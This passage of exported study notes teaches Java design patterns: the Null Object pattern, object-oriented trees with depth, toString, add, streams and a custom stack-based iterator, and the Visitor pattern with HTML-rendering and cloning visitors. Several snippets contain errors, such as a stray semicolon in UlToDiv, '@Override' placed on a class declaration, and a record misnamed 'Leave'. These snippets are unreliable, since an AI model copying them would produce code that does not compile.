style="width:100%"><p id="ff379244-9d83-48c5-b82c-620eac79f42c" class="">subtype where the method <mark class="highlight-yellow_background">implementations does nothing</mark></p><ul id="eb145e6e-a5ca-4008-aaf2-3754f89b53e5" class="bulleted-list"><li style="list-style-type:disc">instead of setting a variable to null, set it to a null object</li></ul><ul id="3100d518-6dc6-456c-9dc5-dc78bc911d3c" class="bulleted-list"><li style="list-style-type:disc">prevents method calls on null variables to cause errors</li></ul><ul id="1652c621-3c16-47da-a358-6300bb9ec029" class="bulleted-list"><li style="list-style-type:disc">variable assigned a Null Object will do nothing</li></ul><figure id="3ba857e7-9974-4907-861b-273d2a09b6ac" class="image" style="text-align:center"><a href="Untitled%208.png"><img style="width:384px" src="Untitled%208.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cd1a401b-9474-44f4-8e47-80671161abae" class="code"><code class="language-Java">class Dead implements WarriorState {
		public void ping(Warrior w){}
		public void damage(Warrior w, int i) {}
		public int attack(Warrior w){ throw new Error(&quot;...&quot;); }
		public void draw(Warrior w, Graphics g){ /*...*/ }
}
//decides to do nothing or throw an error
//decides a simplified return value for operations with return types
//(eg: 0, null or error)

class Warrior {
		WarriorState state;
		
		public void ping(){state.ping(this);}
}

Warrior w = new Warrior();
//w.state = null;
//w.ping(); //will fail

w.state = new Dead();
w.ping(); //will not throw an error but does nothing</code></pre></div></figure></details></li></ul><ul id="f917bbf8-bb66-4ad0-8e0b-86d3e5199d7f" class="toggle"><li><details><summary>Object Oriented Trees </summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="6abdf18d-591f-472d-aa1e-9e57161ee4ab"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="42e7af2d-0a0f-4f7f-b4ff-ade57b5b0f93" class="">object oriented data structures follow 3 rules</p><ol type="1" id="6e862d67-358c-4a01-839f-c86cbd1d8309" class="numbered-list" start="1"><li>using <mark class="highlight-blue_background">types to model the shape </mark>of the data structure</li></ol><ol type="1" id="08cd9af6-b3ec-4e1c-a6e5-b5144702c752" class="numbered-list" start="2"><li>add <mark class="highlight-blue_background">operations</mark></li></ol><ol type="1" id="2cd73bdf-7fa3-41a6-8f75-71f373d0fed2" class="numbered-list" start="3"><li><mark class="highlight-blue_background">clean up</mark> the code for conveniency/safety/efficiency</li></ol></div></figure><h3 id="b45f9cea-4133-4774-bb47-b047071f9c8f" class="">1) Types</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1e3d33ca-2043-432c-9cbe-7018f6618e15" class="code"><code class="language-Java">interface Tree&lt;E&gt;{} //top level concept

//subtyping to model the shape

final class EmptyTree&lt;E&gt; implements Tree&lt;E&gt;{} //empty tree

interface NonEmptyTree&lt;E&gt; extends Tree&lt;E&gt;{} //onCon tree

record Leaf&lt;E&gt;(E label) implements NonEmptyTree&lt;E&gt;{} //concrete leaf type

record Node&lt;E&gt;(NonEmptyTree&lt;E&gt; left,NonEmptyTree&lt;E&gt; right)
							implements NonEmptyTree&lt;E&gt;{} //concrete parent type</code></pre><figure id="8e2c77cc-9c61-4bde-9b52-022ab0324f1d" class="image"><a href="Untitled%209.png"><img style="width:623.984375px" src="Untitled%209.png"/></a></figure><h3 id="2411ec8f-a07b-493b-bf22-a611b9209826" class="">2) Operations</h3><ul id="fc3c77d3-db22-46a9-b9a9-08cba1644ff4" class="bulleted-list"><li style="list-style-type:disc">depth<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ec94d957-5046-4a72-9ce3-c8384c436bdd" class="code"><code class="language-Java">interface Tree&lt;E&gt;{
 int depth(); //First, define the operation in the top level interface
 //recursive method declaration
}
final class EmptyTree&lt;E&gt; implements Tree&lt;E&gt;{
 public int depth(){ return 0; } //Empty tree has zero depth
 //base case

}
interface NonEmptyTree&lt;E&gt; extends Tree&lt;E&gt;{}
record Leaf&lt;E&gt;(E label) implements NonEmptyTree&lt;E&gt;{
 public int depth(){ return 1; } //Leaf has dept 1
 //base case

}
record Node&lt;E&gt;(NonEmptyTree&lt;E&gt; left, NonEmptyTree&lt;E&gt; right)
 implements NonEmptyTree&lt;E&gt;{
 //The node dept is 1 + the max depth of either child
 public int depth(){ return 1 + Math.max(left.depth(), right.depth()); }
 //recursive/inductive case
}
</code></pre></li></ul><ul id="8e6e9e46-8c42-4904-a71c-699ae4944307" class="bulleted-list"><li style="list-style-type:disc">toString<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e86fc033-e3cd-47e2-ad57-4743d370630f" class="code"><code class="language-Java">interface Tree&lt;E&gt;{
	public String toString();
}

final class EmptyTree&lt;E&gt; implements Tree&lt;E&gt;{
 public String toString(){ return &quot;&lt;EMPTY&gt;&quot;; }
}

interface NonEmptyTree&lt;E&gt; extends Tree&lt;E&gt;{}
record Leaf&lt;E&gt;(E label) implements NonEmptyTree&lt;E&gt;{
 public String toString(){ return label+&quot;&quot;; }
}

record Node&lt;E&gt;(NonEmptyTree&lt;E&gt; left, NonEmptyTree&lt;E&gt; right)
 implements NonEmptyTree&lt;E&gt;{
 public String toString(){ return &quot;(&quot;+left+&quot;, &quot;+right+&quot;)&quot;; }
}

//NOTE the 3 lines of code below are all equivalent
//Short &quot;(&quot; + left + &quot;, &quot; + right + &quot;)&quot;
//Longer &quot;(&quot; + this.left + &quot;, &quot; + this.right + &quot;)&quot;
//Longest &quot;(&quot; + this.left.toString() + &quot;, &quot; + this.right.toString() + &quot;)&quot;
//Often the ‘recursive call’ happens implicitly or indirectly</code></pre></li></ul><ul id="8256bb08-a1d2-4fc6-af39-1fd0642ed37c" class="bulleted-list"><li style="list-style-type:disc">add<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a88153f1-59b9-4725-8edc-08877252622e" class="code"><code class="language-Java">interface Tree&lt;E&gt;{
 Tree&lt;E&gt; and(Tree&lt;E&gt; other);
}
final class EmptyTree&lt;E&gt; implements Tree&lt;E&gt;{
 public Tree&lt;E&gt; and(Tree&lt;E&gt; other){ return other; }
}
interface NonEmptyTree&lt;E&gt; extends Tree&lt;E&gt;{
 default Tree&lt;E&gt; and(Tree&lt;E&gt; other){
 if (!(other instanceof NonEmptyTree net)){ return this; }
 return new Node&lt;E&gt;(this, net);
 }
}//Note: return new Node&lt;E&gt;(this, other);would not typecheck!
record Leaf&lt;E&gt;(E label) implements NonEmptyTree&lt;E&gt;{}
record Node&lt;E&gt;(NonEmptyTree&lt;E&gt; left, NonEmptyTree&lt;E&gt; right)
 implements NonEmptyTree&lt;E&gt;{}
 
//Harder:
//-Adding an empty tree should
// return the other tree.
//-To create a Node we need two
// non empty trees.
 
//Imperative solution:
//Use instanceof!
//Probably the simple and
//good solution here.

</code></pre></li></ul><h3 id="dbdd146e-c7b0-44e5-ac06-345e10bdc5cb" class="">Clean up</h3><ul id="c7a0cf01-a629-4b31-9486-b65805b160a6" class="bulleted-list"><li style="list-style-type:disc">empty tree should be a singleton pattern</li></ul><ul id="891ea91c-10e8-4bae-8d18-aac1aa9a7ac8" class="bulleted-list"><li style="list-style-type:disc">left and right return an empty tree when called on an empty tree, could throw an exception instead</li></ul><ul id="ec27e3c4-a143-4166-9bba-f74e2534fcfd" class="bulleted-list"><li style="list-style-type:disc">instead of returning an optional for the label method (when the tree is empty) we can accept a supplier orElse which will return orElse.get() if the tree is empty<ul id="df6c9bb8-a594-48e4-ab4f-f58d136837d8" class="bulleted-list"><li style="list-style-type:circle">we can define what the get method does on the orElse by overriding the supplier</li></ul><ul id="2dc8378e-4752-412f-8011-1bff17c5b4e1" class="bulleted-list"><li style="list-style-type:circle">can return a default case, eg if E is an int, return 0</li></ul><ul id="7c149e13-e5dd-4ce5-be8e-646a48e6f00f" class="bulleted-list"><li style="list-style-type:circle">could define which exception to throw<code>myTree.label(()-&gt; { throw new Error(); })</code></li></ul></li></ul><ul id="c4538764-5c6f-47a9-8ab1-edb6bfa8a830" class="bulleted-list"><li style="list-style-type:disc">method return type refinement: node record overrides left and right method to return a NonEmptyTree instead of just a Tree. this works because NonEmptyTree is a subtype of tree</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a5303150-46cd-4d67-af5b-03643fa34529" class="code"><code class="language-Java">interface Tree&lt;E&gt; { /*..*/
 static &lt;E&gt; Tree&lt;E&gt; leaf(E label){ return new Leaf&lt;E&gt;(label); }
 @SuppressWarnings(&quot;unchecked&quot;)//Singleton pattern: dirty with generics
 static &lt;E&gt; Tree&lt;E&gt; empty(){ return (Tree&lt;E&gt;)EmptyTree.Instance; }
 default Tree&lt;E&gt; left(){ return empty(); }
 default Tree&lt;E&gt; right(){ return empty(); }
 default E label(Supplier&lt;E&gt; orElse){ return orElse.get(); }
}
enum EmptyTree implements Tree&lt;Object&gt;{//Singleton pattern: dirty with generics
 Instance;
}
interface NonEmptyTree&lt;E&gt; extends Tree&lt;E&gt; { /*..*/ }
record Leaf&lt;E&gt;(E label) implements NonEmptyTree&lt;E&gt;{ /*..*/
 public E label(Supplier&lt;E&gt; orElse){ return label; }
}
record Node&lt;E&gt;(NonEmptyTree&lt;E&gt; left, NonEmptyTree&lt;E&gt; right)
 implements NonEmptyTree&lt;E&gt;{
 /*..*/
 public Node{ assert left != null &amp;&amp; right != null; }
}</code></pre><h3 id="7ab8b5f6-3095-4bc3-a0b0-7176dbcbd5a3" class="">Stream Method: easy way</h3><p id="5ee67f19-932e-4ac6-bc42-ce0f5734a4bc" class="">to make our data structure streamable, add a stream method that returns a stream at the top level and implement it in all your types like adding an operation</p><p id="4a8ffa23-81c5-4f21-9ea2-e0ab94248e1e" class="">this approach just gives you a stream over all elements of the data structure</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="27710b23-c94c-481d-a72b-0a9cd957cf04" class="code"><code class="language-Java">interface Tree&lt;E&gt;{
 Stream&lt;E&gt; stream();
}
enum EmptyTree implements Tree&lt;Object&gt;{Instance;
 public Stream&lt;Object&gt; stream(){ return Stream.of(); }
}
interface NonEmptyTree&lt;E&gt; extends Tree&lt;E&gt;{}
record Leave&lt;E&gt;(E label) implements NonEmptyTree&lt;E&gt;{
 public Stream&lt;E&gt; stream(){ return Stream.of(label); }
}
record Node&lt;E&gt;(NonEmptyTree&lt;E&gt; left, NonEmptyTree&lt;E&gt; right)
 implements NonEmptyTree&lt;E&gt;{
 public Stream&lt;E&gt; stream(){ return Stream.concat(left.stream(),right.stream()); }
}

//Empty stream
//Singleton stream
//(not to be confused with the singleton pattern)
//Stream concatenation.

//the same as the depth method</code></pre><h3 id="823fc068-8394-43dc-951b-ff259dfd7a37" class="">Stream from Iterator: hard way</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="660dde63-4d3d-4411-b697-1d4b76a73415" class="code"><code class="language-Java">interface Tree&lt;E&gt; extends Iterable&lt;E&gt;{/*..*/
	 default Stream&lt;E&gt; stream(){ 
			 return StreamSupport.stream(spliterator(), false); 
		}
		//Iterable gives us ‘spliterator’ for free. 
		//We can turn spliterators into streams.
}


//The empty tree has an empty iterator
enum EmptyTree implements Tree&lt;Object&gt;{/*..*/
 public Iterator&lt;Object&gt; iterator(){ 
	 return Collections.emptyIterator(); 
	}
}
//Collections.emptyLiterator returns an empty iterator, 
//its the same as making an empty list and asking for an iterator from it
//Collections.emptyIterator()
// ==
//List.&lt;E&gt;of().iterator()
//Empty list → empty iterator

interface NonEmptyTree&lt;E&gt; extends Tree&lt;E&gt;{ /*..*/ }
record Leaf&lt;E&gt;(E label) implements NonEmptyTree&lt;E&gt;{/*..*/
 public Iterator&lt;E&gt; iterator(){ return List.&lt;E&gt;of(label).iterator(); }
}
//The Leaf has an iterator with a single element
//Sadly, Java still have no Iterator.of(..) or any
//Collections.singletonIterator(e) method, so we can use
//List.of(label) to get a list of one element and get the
//iterator form it.

//there is no singinton iterator, so make a list.of the label and
//return the iterator for it when implementing iterator for a leaf node 
//(which only contains a single item)

record Node&lt;E&gt;(NonEmptyTree&lt;E&gt; left, NonEmptyTree&lt;E&gt; right) implements
NonEmptyTree&lt;E&gt;{/*..*/
 public Iterator&lt;E&gt; iterator(){ return new TreeIterator&lt;E&gt;(this); }
}

//Our custom iterator for the non trivial trees. Here is the hard bit!

//for a node that has children, we need to return a custom iterator 
//we make ourselves to allow the ablity to iterate through the children
class TreeIterator&lt;E&gt; implements Iterator&lt;E&gt;{ /*..*/ }</code></pre><h3 id="03e44459-873a-4cea-b13b-7cf6cae93d76" class="">Our Own Iterator</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="246c8f8c-7ad4-4de0-93cb-414f23be5f07" class="code"><code class="language-Java">class TreeIterator&lt;E&gt; implements Iterator&lt;E&gt;{
 private final ArrayList&lt;NonEmptyTree&lt;E&gt;&gt; stack= new ArrayList&lt;&gt;(32); 
 //32 in the arraylist constructor initlizes the arraylist to allocate \
 //32 items of memory so we don&#x27;t have to reallocate for a while after creation
 public boolean hasNext(){ return !stack.isEmpty(); }
 public TreeIterator(Node&lt;E&gt; n){ stack.add(n); }
 public E next(){
 if (stack.isEmpty()){ throw new NoSuchElementException(); }
 var last= stack.remove(stack.size() - 1);//remove at the end
 return last.itAdvance(stack).label();//next Leaf + grow stack
 }
}
Our custom iterator
Walking on trees step by step
takes some effort (stack)
Non empty stack == more nodes to explore
Start: the top level node is the next node to visit
Should not be called on empty stacks
Get the node that we need to visit next Ask the tree to visit itself! (next slide)</code></pre><p id="628dd546-095f-4900-984a-3410ed5534de" class="">itAdvance allows the tree to visit itself</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e0d16340-936e-4b02-8ab7-942b98f7ee90" class="code"><code class="language-Java">interface NonEmptyTree&lt;E&gt; extends Tree&lt;E&gt;{/*..*/
 Leaf&lt;E&gt; itAdvance(ArrayList&lt;NonEmptyTree&lt;E&gt;&gt; stack);
 //next leftmost Leaf + grow stack with all the skipped Nodes
}
record Leaf&lt;E&gt;(E label) implements NonEmptyTree&lt;E&gt;{/*..*/
 public Leaf&lt;E&gt; itAdvance(ArrayList&lt;NonEmptyTree&lt;E&gt;&gt; stack){ return this; }
 //It is a leaf; just return it!
}
record Node&lt;E&gt;(NonEmptyTree&lt;E&gt; left, NonEmptyTree&lt;E&gt; right)
 implements NonEmptyTree&lt;E&gt;{/*..*/
 public Leaf&lt;E&gt; itAdvance(ArrayList&lt;NonEmptyTree&lt;E&gt;&gt; stack){
 stack.add(right);
 //we are traversing this node on the left, so we are ‘skipping’
 //the right one.
 //We add it to the stack to remember about it.
 return left.itAdvance(stack);
 //OO recursive call
 }
}

//Our custom iterator
//IteratorAdvance: done with dynamic dispatch.
//-Navigate on Node,
//-return on Leaf</code></pre><p id="7d5aecb1-d70f-408e-a8da-a74fbb6a7292" class="">
</p></details></li></ul><ul id="18c4057f-d5e2-4c69-a785-4eab0fd8f8f9" class="toggle"><li><details><summary>Visitor Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="3059d512-2eec-458a-bbae-f64bc8bb5361"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="bfc35714-55c3-4b16-840c-02ed75a8387d" class="">operations represented as objects</p><ul id="d82c36ad-f03f-47dd-9a67-43b7de56f99c" class="bulleted-list"><li style="list-style-type:disc">adding an operation to a composite pattern with many concrete types requires providing implementations to each type -messy</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fadbac2d-0069-40e6-8ff4-6ff603561a19" class="code"><code class="language-Java">//visitor (operation return type T)
interface Visitor&lt;T&gt;{
	//visit methods for each concrete type
	//note how they accept the cocnrete type pointer as a parameter
	 T visitP(P e);
	 T visitDiv(Div e);
	 T visitA(A e);
	 T visitUl(Ul e);
	 T visitLi(Li e);
}

//component
interface Node{ 
		&lt;T&gt; T accept(Visitor&lt;T&gt; v); 
		//abstract accept method (takes a visitor and returns a T)
}

//composite and leaf types
record P(String text) implements Node{
 public &lt;T&gt; T accept(Visitor&lt;T&gt; v){ 
	 return v.visitP(this); 
 }
 //implement accept method by calling its corresponding visit method
}

record Div(List&lt;Node&gt; ns) implements Node{
 public &lt;T&gt; T accept(Visitor&lt;T&gt; v){ return v.visitDiv(this); }
}
record A(String href, String text) implements Node{
 public &lt;T&gt; T accept(Visitor&lt;T&gt; v){ return v.visitA(this); }
}
record Ul(List&lt;Li&gt; lis) implements Node{
 public &lt;T&gt; T accept(Visitor&lt;T&gt; v){ return v.visitUl(this); }
}
record Li(Node node) implements Node{
 public &lt;T&gt; T accept(Visitor&lt;T&gt; v){ return v.visitLi(this); }
}</code></pre></div></figure><h3 id="45f55f86-32fd-4c79-8bf9-aa9062a5e254" class="">ToHTML Operation</h3><ul id="52b39ed8-175c-4245-9302-d1c448933a91" class="bulleted-list"><li style="list-style-type:disc">the ToHTML operation we want to add to each concrete type is implemented in its own class that extends the visitor</li></ul><ul id="8ffbeaa0-a6fa-4d75-be28-ab28e2f87a48" class="bulleted-list"><li style="list-style-type:disc">Visitor of type String, as the return type of the operation is a string</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7c2f91da-650d-47ed-8338-3ca07b23a9cf" class="code"><code class="language-Java">class ToHtml implements Visitor&lt;String&gt;{
	public String visitP(P e){ 
			return &quot;&lt;P&gt;&quot;+e.text()+&quot;&lt;/P&gt;&quot;; 
	}
	
	public String visitDiv(Div e){
	 return e.ns().stream().map(ei-&gt;ei.accept(this))
		 .collect(Collectors.joining(&quot;\n&quot;,&quot;&lt;DIV&gt;\n&quot;,&quot;\n&lt;/DIV&gt;&quot;));
	}
	
	public String visitA(A e){
			return &quot;&lt;A href=\&quot;&quot;+e.href()+&quot;\&quot;&gt;&quot;+e.text()+&quot;&lt;/A&gt;&quot;;
	}
	
	public String visitUl(Ul e){
	 return e.lis().stream().map(li-&gt;visitLi(li))
		 .collect(Collectors.joining(&quot;\n&quot;,&quot;&lt;UL&gt;\n&quot;,&quot;\n&lt;/UL&gt;&quot;));
	}
	
	public String visitLi(Li e){
			return &quot;&lt;LI&gt;&quot;+e.node().accept(this)+&quot;&lt;/LI&gt;&quot;; 
	}
}</code></pre><h3 id="cb2ed6dc-1967-44cd-a9a2-0d03297ff565" class="">CloneVisitor</h3><p id="dd04a4c3-4753-4867-8024-4cdd00fee338" class="">a type of visitor that returns a copy of the concrete type</p><ul id="a42c2c42-ead2-4429-bcab-3cff45ce7197" class="bulleted-list"><li style="list-style-type:disc">allows for code reuse for creating visitor operations on top of the clone visitor to do overriding later</li></ul><ul id="23ef2261-212f-4c32-aecc-02c67318b0a8" class="bulleted-list"><li style="list-style-type:disc">another way to look at it, is that the clonevisitor is adding an operation to clone said object</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="556fa52f-048a-4dce-9c11-cf3d8a7b6aed" class="code"><code class="language-Java">class CloneVisitor implements Visitor&lt;Node&gt;{
		public Node visitP(P e){ return e; }
		
		//we&#x27;re extending Visitor&lt;Node&gt; but visitDiv operation
		//can refine the return type to a Div (which extends Node)
		public Div visitDiv(Div e){
				var ns= e.ns().stream()
				.map(ei-&gt;ei.accept(this))
				.toList();
				return new Div(ns);
		}
		
		public A visitA(A e){ return e; }
		
		public Node visitUl(Ul e){
				var lis= e.lis().stream()
				.map(ei-&gt;visitLi(ei))
				.toList();
				return new Ul(lis);
				}
				public Li visitLi(Li e){
				return new Li(e.node().accept(this));
		}
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="47922b25-2f0c-4042-ab91-b018aa2a897b" class="code"><code class="language-Java">class ToItalian extends CloneVisitor{ //Solution for Visitors 3
		@Override public Node visitP(P e){ return new P(e.text()+&quot; with PIZZA!!&quot;); }
}

class ReverseDivs extends CloneVisitor{
		@Override public Div visitDiv(Div e){
		 var ns= e.ns().stream()
		 .map(ei-&gt;ei.accept(this))
		 .collect(Collectors.toCollection(ArrayList::new));
		 Collections.reverse(ns);
		 return new Div(Collections.unmodifiableList(ns));
		 }
}

class UlToDiv extends CloneVisitor{
	 @Override public Node visitUl(Ul e){
			 var ns= e.lis().stream()
			 .map(li-&gt;visitLi(li))
			 .map(li-&gt;li.node());
			 .toList();
			 return new Div(ns);
	 }
}

class CloneVisitorInLi extends CloneVisitor{
 //Visitors can have state relative to the visit operation itself
 protected boolean inLi= false;
 public Li visitLi(Li li){
 boolean oldInLi= inLi;
 inLi = true;
 try{ return super.visitLi(li); }
 finally{ inLi = oldInLi; }
 }
}

@Override class TastyLi extends CloneVisitorInLi{
 public Node visitP(P e){
		 if (inLi){ return new P(e.text() + &quot; with PIZZA!!&quot;); }
		 return super.visitP(e);
 }
}

class CollectAllText extends CloneVisitor{
 //usage new CollectAllText().collect(myNode)
 @Override public String collect(Node n){ //Slow, it also clone it all.
		 var wasted= n.accept(this); //We could define a PropagatorVisitor
		 return allText; //that does not clone the data
		 }
		 String allText= &quot;&quot;;
		 public Node visitP(P e){
		 allText += e.text();
		 return super.visitP(e);
 }
